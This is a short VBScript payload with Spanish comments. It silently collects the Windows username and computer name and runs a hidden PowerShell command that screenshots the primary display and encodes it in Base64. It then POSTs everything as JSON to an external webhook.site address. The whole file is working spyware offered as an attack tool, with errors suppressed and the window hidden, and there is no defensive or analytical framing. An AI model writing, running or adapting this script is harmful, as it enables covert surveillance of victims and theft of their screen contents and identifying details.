' --- Payload de Captura de Pantalla y Exfiltración en Base64 ---
On Error Resume Next

Dim objShell, objNetwork, userName, computerName, jsonPayload, http
Dim psCommand, base64String

' --- Recopilación de Información Básica ---
Set objNetwork = CreateObject("WScript.Network")
userName = objNetwork.UserName
computerName = objNetwork.ComputerName

' --- Comando de PowerShell para la Captura y Conversión ---
' Este es el corazón de la operación. Es un script de PowerShell de una sola línea.
psCommand = "powershell -WindowStyle Hidden -Command ""Add-Type -AssemblyName System.Windows.Forms; " & _
            "$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds; " & _
            "$bmp = New-Object System.Drawing.Bitmap $screen.Width, $screen.Height; " & _
            "$graphics = [System.Drawing.Graphics]::FromImage($bmp); " & _
            "$graphics.CopyFromScreen($screen.Location, [System.Drawing.Point]::Empty, $screen.Size); " & _
            "$ms = New-Object System.IO.MemoryStream; " & _
            "$bmp.Save($ms, [System.Drawing.Imaging.ImageFormat]::Png); " & _
            "$bytes = $ms.ToArray(); " & _
            "[Convert]::ToBase64String($bytes)"""

' Ejecutamos el comando de PowerShell y capturamos su salida (la cadena Base64).
Set objShell = CreateObject("WScript.Shell")
Set exec = objShell.Exec(psCommand)
base64String = exec.StdOut.ReadAll()

' --- Construcción del Payload JSON ---
' Creamos un JSON que contiene la información del usuario y la captura en Base64.
jsonPayload = "{""username"":""" & userName & """, " & _
              """computerName"":""" & computerName & """, " & _
              """screenshot_b64"":""" & base64String & """}"

' --- Exfiltración de Datos ---
' Enviamos el JSON a nuestro webhook.
Set http = CreateObject("MSXML2.ServerXMLHTTP")
http.open "POST", "https://webhook.site/7fd9006c-0899-4a59-9b31-bda674f6acbc", False
http.setRequestHeader "Content-Type", "application/json; charset=UTF-8"
http.send jsonPayload
